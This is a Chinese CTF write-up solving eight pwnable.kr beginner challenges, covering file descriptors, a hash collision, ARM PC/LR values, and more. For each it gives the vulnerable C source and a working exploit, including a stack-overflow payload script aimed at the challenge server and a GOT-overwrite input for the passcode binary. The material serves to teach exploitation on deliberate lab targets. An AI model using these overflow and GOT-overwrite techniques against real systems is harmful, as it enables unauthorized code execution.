# pwnable刷题writeup之Toddler’s Bottle（一）

> 来源：http://burningcodes.net/pwnable%E5%88%B7%E9%A2%98writeup%E4%B9%8Btoddlers-bottle%EF%BC%88%E4%B8%80%EF%BC%89/

最近在练习pwn， [pwnable.kr](http://pwnable.kr) 这个网站有很多很有意思的pwn题，现放出我的部分刷题writeup：

## 1.fd

源码如下：

C

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
    if(argc<2){
        printf("pass argv[1] a number\n");
        return 0;
    }
    int fd = atoi( argv[1] ) - 0x1234;
    int len = 0;
    len = read(fd, buf, 32);
    if(!strcmp("LETMEWIN\n", buf)){
        printf("good job :)\n");
        system("/bin/cat flag");
        exit(0);
    }
    printf("learn about Linux file IO\n");
    return 0;

}
```

第一题送分，文件描述符中0为标准输入，1为标准输出，2为标准错误输出，输入如下得到flag：

```
./fd 4660
LETMEWIN

good job :)
flag:  mommy! I think I know what a file descriptor is!!
```

## 2\. col

源码如下：

C

```
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
    int* ip = (int*)p;
    int i;
    int res=0;
    for(i=0; i<5; i++){
        res += ip[i];
    }
    return res;
}

int main(int argc, char* argv[]){
    if(argc<2){
        printf("usage : %s [passcode]\n", argv[0]);
        return 0;
    }
    if(strlen(argv[1]) != 20){
        printf("passcode length should be 20 bytes\n");
        return 0;
    }

    if(hashcode == check_password( argv[1] )){
        system("/bin/cat flag");
        return 0;
    }
    else
        printf("wrong passcode.\n");
    return 0;
}
```

输入20字节，每4字节作为一个整数，相加后得到 0x21DD09EC即可。由于是通过strlen判断长度，所以不能有0x00出现，将0x21DD09EC拆分成5个整数相加（0x01010101 + 0x01010101 + 0x01010101 + 0x01010101 + 0x1DD905E8）

```
./col $(python -c 'print "\xE8\x05\xD9\x1D" + 16*"\x01"')

flag ： daddy! I just managed to create a hash collision :)
```

## 3.bof

C

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);    // smash me!
    if(key == 0xcafebabe){
        system("/bin/sh");
    }
    else{
        printf("Nah..\n");
    }
}
int main(int argc, char* argv[]){
    func(0xdeadbeef);
    return 0;
}
```

用objdump看bof的反汇编，找到overflowme数组起始地址距离ebp的长度为0x2c(44),加上ebp，eip8字节，共要填充52字节：

![](http://img1.tuicool.com/VVjM3aE.png!web)

python脚本跑出flag：

Python

```
from zio import *
host = "143.248.249.64"
port = 9000
io = zio((host,port),print_read=False,print_write=False)
payload = "A"*52 + "\xbe\xba\xfe\xca" + "\n"
io.write(payload+"\n")
io.write("cat flag\n")
buf = io.read_until("\n")
print buf
```

## 4.flag

ida打开发现程序被加壳了，用010editor打开发现是UPX的壳，用upx命令脱壳：

```
upx -d flag -o deflag
```

脱壳后用ida直接找到flag字符串 flag： UPX…? sounds like a delivery service ![](http://img1.tuicool.com/UZzIV3n.png!web)

## 5.passcode

漏洞代码如下：

C

```
#include <stdio.h>
#include <stdlib.h>

void login(){
    int passcode1;
    int passcode2;

    printf("enter passcode1 : ");
    scanf("%d", passcode1);
    fflush(stdin);

    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
    printf("enter passcode2 : ");
    scanf("%d", passcode2);

    printf("checking...\n");
    if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");

        }
        else{
                printf("Login Failed!\n");
        exit(0);
        }
}

void welcome(){
    char name[100];
    printf("enter you name : ");
    scanf("%100s", name);
    printf("Welcome %s!\n", name);
}

int main(){
    printf("Toddler's Secure Login System 1.0 beta.\n");

    welcome();
    login();

    // something after login...
    printf("Now I can safely trust you that you have credential :)\n");
    return 0;    
}
```

这段代码存在scanf误用，读入的数据并没有写入passcode1，passcode2，而是写入了passcode1，passcode2未被初始化时所存储的内容，经过gdb调试发现welcome函数中的name变量最后4字节刚好可以覆盖到passcode1（堆栈平衡之后并没有情况栈，所以栈中残留着局部变量name），这样就可以通过控制name的最后4字节达到任意地址写。

最简单的想法是让代码直接跳转到system(“/bin/cat flag”);但是又不能直接修改eip，这时想到了修改GOT表，直接把下一个要执行的函数地址改成输出flag的代码的起始地址，通过objdump找到system(“/bin/cat flag”);代码起始地址：

```
80485ce:    81 7d f4 c9 07 cc 00     cmpl   $0xcc07c9,-0xc(%ebp)
 80485d5:    75 1a                    jne    80485f1 <login+0x8d>
 80485d7:    c7 04 24 a5 87 04 08     movl   $0x80487a5,(%esp)
 80485de:    e8 6d fe ff ff           call   8048450 <puts@plt>
 80485e3:    c7 04 24 af 87 04 08     movl   $0x80487af,(%esp)
 80485ea:    e8 71 fe ff ff           call   8048460 <system@plt>
```

可以看到起始地址为0x80485e3。scanf下一句代码是fflush(stdin); 同样用objdump找到fflush的GOT表地址：

```
08048430 <fflush@plt>:
 8048430:       ff 25 04 a0 04 08       jmp    *0x804a004
 8048436:       68 08 00 00 00          push   $0x8
 804843b:       e9 d0 ff ff ff          jmp    8048410 <_init+0x30>
```

GOT表项地址为0x804a004 。最终构造shellcode输入：

```
python -c 'print "A"*96 + "\x04\xa0\x04\x08" + "134514147\n"' | ./passcode
```

134514147为0x80485e3的十进制数值（因为 %d是取出整数），得到flag：Sorry mom.. I got confused about scanf usage ![](http://img2.tuicool.com/MBzqyaY.png!web)

## 6.random

C

```
#include <stdio.h>

int main(){
        unsigned int random;
        random = rand();        // random value!

        unsigned int key=0;
        scanf("%d", &key);

        if( (key ^ random) == 0xdeadbeef ){
                printf("Good!\n");
                system("/bin/cat flag");
                return 0;
        }

        printf("Wrong, maybe you should try 2^32 cases.\n");
        return 0;
}
```

c中的rand函数产生的是伪随机数,每次产生出的是固定值，在本地跑一下发现固定为1804289383,于0xdeadbeef异或后得到3039230856，输入后得到flag：

Mommy, I thought libc random is unpredictable…

## 7.input

这里主要考察Linux编程，题目如下：

C

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
    printf("Welcome to pwnable.kr\n");
    printf("Let's see if you know how to give input to program\n");
    printf("Just give me correct inputs then you will get the flag :)\n");

    // argv

    if(argc != 100) return 0; //参数个数为100-1 ,argv[0]是程序路径及名称
    if(strcmp(argv['A'],"\x00")) return 0;//argv[65]
    if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;//argv[66]
    printf("Stage 1 clear!\n");    

    // stdio 用管道重定向该进程的标准输入
    char buf[4];
    read(0, buf, 4);//从标准输入中读
    if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
    read(2, buf, 4);//从标准错误输出中读
    if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
    printf("Stage 2 clear!\n");

    // env
    if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;//设置环境变量
    printf("Stage 3 clear!\n");

    // file 从文件\x0a中 读出4字节 判断是否为 \x00\x00\x00\x00
    FILE* fp = fopen("\x0a", "r");
    if(!fp) return 0;
    if( fread(buf, 4, 1, fp)!=1 ) return 0;
    if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
    fclose(fp);
    printf("Stage 4 clear!\n");    

    // network
    int sd, cd;
    struct sockaddr_in saddr, caddr;
    sd = socket(AF_INET, SOCK_STREAM, 0);
    if(sd == -1){
        printf("socket error, tell admin\n");
        return 0;
    }
    saddr.sin_family = AF_INET;
    saddr.sin_addr.s_addr = INADDR_ANY;
    saddr.sin_port = htons( atoi(argv['C']) );//监听端口为argv[67]
    if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
        printf("bind error, use another port\n");
            return 1;
    }
    listen(sd, 1);
    int c = sizeof(struct sockaddr_in);
    cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
    if(cd < 0){
        printf("accept error, tell admin\n");
        return 0;
    }
    if( recv(cd, buf, 4, 0) != 4 ) return 0;
    if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
    printf("Stage 5 clear!\n");

    // here's your flag
    system("/bin/cat flag");    
    return 0;
}
```

通过代码及注释如下：

```
#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<sys/types.h> 
#include<sys/socket.h> 
#include<netinet/in.h> 
#include<unistd.h> 

int main() {
    char *argv[101]={0};
    char *envp[2]={0};
    int i;
    for(i=0;i<100;++i)
    {
        argv[i] = "a";
    }
    argv['A'] = "\x00";
    argv['B'] = "\x20\x0a\x0d";
    argv['C'] = "12345";//服务器端监听端口

    envp[0] = "\xde\xad\xbe\xef=\xca\xfe\xba\xbe";//环境变量

    int pip1[2];//pip1[0]为读而开，pip1[1]为写而开, **往pip1[1]中写入的数据可以从pip1[0]中读出**
    int pip2[2];
    if(pipe(pip1)<0||pipe(pip2)<0)  
      {  
        printf("pipe error!/n");  
        return ;  
      }  

    FILE* fp = fopen("\x0a", "wb");
    if(!fp) 
    {
        printf("file create error!\n");
        exit(-1);
    }
    fwrite("\x00\x00\x00\x00", 4, 1, fp);
    fclose(fp);

    //fork之后，子进程会拷贝父进程的文件描述符表，并且将所有引用计数都加一，所以在父进程和子进程中都要close
    if(fork()==0)
     {      //子进程
        //要把父进的输出作为子进程的输入
        dup2(pip1[0],0);//子进程从pip1[0]中读，而不是从标准输入0中读
        close(pip1[1]);
        dup2(pip2[0],2);
        close(pip2[1]);
        execve("/home/input/input",argv,envp);

     }else{
        sleep(1);
        close(pip1[0]);
        write(pip1[1],"\x00\x0a\x00\xff",4);
        close(pip2[0]);
        write(pip2[1],"\x00\x0a\x02\xff", 4);
       }

    //等待服务器建立好再连
    sleep(5);

    int client_sockfd;  
    int len;  
    struct sockaddr_in remote_addr; //服务器端网络地址结构体 
    char buf[10]={0};  //数据传送的缓冲区 
    memset(&remote_addr,0,sizeof(remote_addr)); //数据初始化--清零 
    remote_addr.sin_family=AF_INET; //设置为IP通信 
    remote_addr.sin_addr.s_addr=inet_addr("127.0.0.1");//服务器IP地址 
    remote_addr.sin_port=htons(12345); //服务器端口号 

    /*创建客户端套接字--IPv4协议，面向连接通信，TCP协议*/  
    if((client_sockfd=socket(PF_INET,SOCK_STREAM,0))<0)  
    {  
        perror("socket");  
        return 1;  
    }  

    /*将套接字绑定到服务器的网络地址上*/  
    if(connect(client_sockfd,(struct sockaddr *)&remote_addr,sizeof(struct sockaddr))<0)  
    {  
        perror("connect");  
        return 1;  
    }  
    //printf("connected to server\n"); 

    strcpy(buf,"\xde\xad\xbe\xef");
    send(client_sockfd,buf,strlen(buf),0);  

    close(client_sockfd);//关闭套接字 

    sleep(2);

    return 0;
}
```

由于只有/tmp目录下才有写权限，而最后读flag的语句为 /bin/cat flag，所以要将flag文件链接到/tmp目录下，在/tmp目录下新建软链接：

```
ln -s /home/input/flag /tmp/flag
```

运行得到flag：Mommy! I learned how to pass various input in Linux ![](http://img1.tuicool.com/UZzIV3n.png!web)

## 8.leg

这题是arm汇编，代码如下：

```
#include <stdio.h>
#include <fcntl.h>
int key1(){
    asm("mov r3, pc\n");
}
int key2(){
    asm(
    "push    {r6}\n"
    "add    r6, pc, $1\n"
    "bx    r6\n"
    ".code   16\n"
    "mov    r3, pc\n"
    "add    r3, $0x4\n"
    "push    {r3}\n"
    "pop    {pc}\n"
    ".code    32\n"
    "pop    {r6}\n"
    );
}
int key3(){
    asm("mov r3, lr\n");
}
int main(){
    int key=0;
    printf("Daddy has very strong arm! : ");
    scanf("%d", &key);
    if( (key1()+key2()+key3()) == key ){
        printf("Congratz!\n");
        int fd = open("flag", O_RDONLY); 0x00008ce4
        char buf[100];
        int r = read(fd, buf, 100);
        write(0, buf, r);
    }
    else{
        printf("I have strong leg :P\n");
    }
    return 0;
}
```

关键是要找到key1，key2，key3的返回值。对于arm汇编要知道几点：

*   前4个参数分别放在R0，R1，R2，R3中，多出来的才存在栈上
*   函数返回值存在R0中
*   LR保存函数的返回地址（函数调用时的下一条指令地址）
*   PC保存当前指令的下2条指令地址，在arm模式下为 当前指令地址+8，在thumb模式下为 当前指令地址+4

先来看key1的汇编：

```
(gdb) disass key1
Dump of assembler code for function key1:
   0x00008cd4 <+0>:    push    {r11}        ; (str r11, [sp, #-4]!)
   0x00008cd8 <+4>:    add    r11, sp, #0
   0x00008cdc <+8>:    mov    r3, pc
   0x00008ce0 <+12>:    mov    r0, r3
   0x00008ce4 <+16>:    sub    sp, r11, #0
   0x00008ce8 <+20>:    pop {r11}        ; (ldr r11, [sp], #4)
   0x00008cec <+24>:    bx    lr
```

可以看到把PC的值作为返回值，在执行到mov r3,pc时，PC的值为0x8cdc+8，即0x8ce4。

key2的汇编：

```
(gdb) disass key2
Dump of assembler code for function key2:
   0x00008cf0 <+0>:    push {r11} ; (str r11, [sp, #-4]!)
   0x00008cf4 <+4>:    add    r11, sp, #0
   0x00008cf8 <+8>:    push {r6} ; (str r6, [sp, #-4]!)
   0x00008cfc <+12>:    add    r6, pc, #1
   0x00008d00 <+16>:    bx    r6
   0x00008d04 <+20>:    mov    r3, pc
   0x00008d06 <+22>:    adds    r3, #4
   0x00008d08 <+24>:    push {r3} 0x00008d0a <+26>:    pop {pc} 0x00008d0c <+28>:    pop {r6} ; (ldr r6, [sp], #4)
   0x00008d10 <+32>:    mov    r0, r3
   0x00008d14 <+36>:    sub    sp, r11, #0
   0x00008d18 <+40>:    pop {r11} ; (ldr r11, [sp], #4)
   0x00008d1c <+44>:    bx    lr
```

在key2中进行了arm到thumb的切换，其中add r6，pc #1只是为了跳转到thumb，跳转之后地址并没有加一。当执行到mov r3,pc时，PC的值为0x8d04+4，即0x8d08，后面再加上4得到返回值为0x8d0c。

key3的汇编：

```
(gdb) disass key3
Dump of assembler code for function key3:
   0x00008d20 <+0>:    push    {r11}        ; (str r11, [sp, #-4]!)
   0x00008d24 <+4>:    add    r11, sp, #0
   0x00008d28 <+8>:    mov    r3, lr
   0x00008d2c <+12>:    mov    r0, r3
   0x00008d30 <+16>:    sub    sp, r11, #0
   0x00008d34 <+20>:    pop {r11}        ; (ldr r11, [sp], #4)
   0x00008d38 <+24>:    bx    lr
```

key3中将lr的值作为返回值，lr的值为调用函数的下一条指令：

```
0x00008d7c <+64>:    bl    0x8d20 <key3>
 0x00008d80 <+68>:    mov    r3, r0
```

所以key3返回值为0x8d80。所有返回值相加得到 0x8ce4 + 0x8d0c + 0x8d80 =  108400

得到flag为：My daddy has a lot of ARMv5te muscle!